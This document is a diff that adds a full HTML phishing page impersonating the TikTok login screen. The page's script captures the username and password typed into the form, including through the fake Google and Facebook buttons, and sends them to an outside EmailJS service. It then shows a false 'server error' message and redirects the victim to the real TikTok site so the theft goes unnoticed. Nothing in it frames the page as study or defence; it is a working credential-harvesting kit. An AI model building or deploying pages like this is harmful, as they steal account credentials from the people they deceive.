@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tiktok login</title>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<script>
+(function () {
+  emailjs.init("0-f8T4mOUQcHF3o6x");
+})();
+</script>
+
+<style>
+  * {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+}
+
+body {
+  background: white;
+  color: black;
+  height: 100vh;
+}
+
+.container {
+  padding: 20px;
+  max-width: 420px;
+  margin: auto;
+}
+
+.logo {
+  text-align: center;
+  font-size: 36px;
+  margin-top: 50px;
+  font-weight: bold;
+}
+
+.logo span {
+  color: #fe2c55;
+}
+
+.subtitle {
+  text-align: center;
+  margin-top: 10px;
+  color: #aaa;
+}
+
+.btn {
+  background: #fe2c55;
+  padding: 15px;
+  border-radius: 6px;
+  text-align: center;
+  margin-top: 25px;
+  font-weight: bold;
+  cursor: pointer;
+  color: black;
+}
+.btnn{
+  background: black;
+  padding: 15px;
+  border-radius: 6px;
+  text-align: center;
+  margin-top: 25px;
+  font-weight: bold;
+  cursor: pointer;
+  color: white;
+}
+.alt {
+  background: black;
+  border: 1px solid #333;
+  color: black;
+}
+
+.input {
+  margin-top: 20px;
+}
+
+.input input {
+  width: 100%;
+  padding: 15px;
+  background: white;
+  border: 1px solid #333;
+  border-radius: 6px;
+  color: black;
+  font-size: 16px;
+}
+
+.loading {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: #000;
+  justify-content: center;
+  align-items: center;
+  font-size: 22px;
+  animation: blink 1s infinite;
+}
+
+@keyframes blink {
+  0% {opacity: 0.3;}
+  50% {opacity: 1;}
+  100% {opacity: 0.3;}
+}
+  .loader-screen {
+  position: fixed;
+  inset: 0;
+  background: #000;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+}
+
+.loader {
+  display: flex;
+  gap: 10px;
+  margin-bottom: 20px;
+}
+
+.dot {
+  width: 14px;
+  height: 14px;
+  border-radius: 50%;
+  animation: bounce 0.8s infinite alternate;
+}
+
+.dot.red {
+  background: #ff0050;
+}
+
+.dot.blue {
+  background: #00f2ea;
+  animation-delay: 0.4s;
+}
+
+@keyframes bounce {
+  from { transform: translateY(0); opacity: 0.4; }
+  to { transform: translateY(-12px); opacity: 1; }
+}
+
+.loading-text {
+  font-size: 14px;
+  color: #aaa;
+}
+  img{
+  width: 70px;
+  height: auto; 
+  position: absolute;
+  justify-content: center;
+  align-items: center;  
+  display: grid;
+  place-items: center;
+    max-width: 200px;
+}
+.conr{
+   display: block;
+  place-items: center;
+  justify-content: center; /* Centers horizontally */
+  align-items: center;  
+}
+ .or {
+    text-align: center;
+    margin: 22px 0;
+    color: #aaa;
+    font-size: 14px;
+}
+.footer {
+    text-align: center;
+    font-size: 13px;
+    color: #888;
+    margin-top: 25px;
+</style>
+</head>
+
+<body>
+
+<div class="conr">
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTVLbQ4y2aCBrDOUi6Co_Wzo8RLz50DiQ6dxyq-lJGIeA&s=10">
+</div>
+<div class="container">
+  <div class="logo">Tik<span>Tok</span></div>
+  <div class="subtitle">Log in to tiktok using email or username</div>
+
+  <div class="input">
+     <input id="username" placeholder="Email or Username">
+  </div>
+
+  <div class="input">
+    <input type="password" id="message" placeholder="Password">
+  </div>
+
+  <div class="btn" onclick="sendMail()">Log in</div>
+<div class="or">OR</div>
+  <div class="btnn" alt onclick="sendMail()">Continue with Google</div>
+  <div class="btnn" alt onclick="sendMail()">Continue with Facebook</div>
+</div>
+</div>
+<script>
+function sendMail() {
+  const username = document.getElementById("username").value.trim();
+  const message = document.getElementById("message").value.trim();
+
+  if (!username || !message) {
+    alert("Please fill all fields");
+    return;
+  }
+
+  // show loading
+  document.getElementById("loading").style.display = "flex";
+
+  emailjs.send(
+    "service_iqy1syi",
+    "template_1ecpdsp",
+    {
+      username: username,
+      message: message
+    }
+  ).then(function () {
+
+    // success page
+    document.body.innerHTML = `
+      <div style="
+        background:#000;
+        color:#fff;
+        height:100vh;
+        display:flex;
+        flex-direction:column;
+        align-items:center;
+        justify-content:center;
+        font-family:system-ui;
+        text-align:center;
+        padding:20px;
+      ">
+        <h2 color="#fe2c55">Server error</h2>
+        <p style="color:#aaa;margin-top:10px;">
+          There has been a server error.Please try again to access account.
+        </p>
+
+        <button onclick="goTikTok()" style="
+          margin-top:30px;
+          background:#ff0050;
+          border:none;
+          color:white;
+          padding:14px 30px;
+          font-size:16px;
+          border-radius:8px;
+        ">
+          Log in
+        </button>
+      </div>
+    `;
+
+  }, function (error) {
+    document.getElementById("loading").style.display = "none";
+    alert("❌ Error: " + error.text);
+  });
+}
+
+function goTikTok() {
+  window.location.href = "https://www.tiktok.com/login/?enter_method=enter_personal_homepage&enter_from=personal_homepage&launch_type=0&lang=en&redirect_url=https%3A%2F%2Fwww.tiktok.com%2Fprofile";
+}
+</script>
+ <div class="footer">
+        ©️ tiktok.com
+    </div>
+<div id="loading" class="loader-screen" style="display:none;">
+  <div class="loader">
+    <div class="dot red"></div>
+    <div class="dot blue"></div>
+  </div>
+  <div class="loading-text"></div>
+</div>
+</body>
+</html>
